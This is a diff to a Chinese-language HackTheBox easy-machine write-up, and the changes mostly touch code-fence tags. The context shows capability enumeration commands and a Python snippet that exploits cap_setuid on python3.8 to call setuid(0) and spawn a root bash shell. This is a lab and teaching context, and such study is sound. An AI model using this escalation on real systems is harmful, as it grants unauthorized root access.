@@ -1,3 +1,5 @@
+
+
 # 一.介绍
 
 第一次打hackthebox的靶机，先打个easy试试
@@ -63,13 +65,13 @@ IDOR(Insecure Direct Object Reference,不安全的直接对象引用)，是一�
 
 这个靶机中这条命令的结果是：
 
-```
+```bash
 getcap /usr/bin/python3.8
 ```
 
 输出：
 
-```
+```shell
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
@@ -77,7 +79,7 @@ getcap /usr/bin/python3.8
 
 普通用户这时就可以运行：
 
-```
+```bash
 import os
 os.setuid(0)
 os.system("/bin/bash")
@@ -107,7 +109,7 @@ getcap -r /usr /bin /sbin /usr/local 2>/dev/null
 
 还可以顺手看一下当前 shell / 某个进程有没有 capability，辅助判断环境：
 
-```
+```bash
 capsh --print      # 查看当前 shell / 当前进程上下文的 capabilities 状态，更全面
 getpcaps 0         # 查看当前正在执行该命令的进程本身拥有的 capabilities
 getpcaps <PID>     # 查看指定 PID 进程拥有的 capabilities
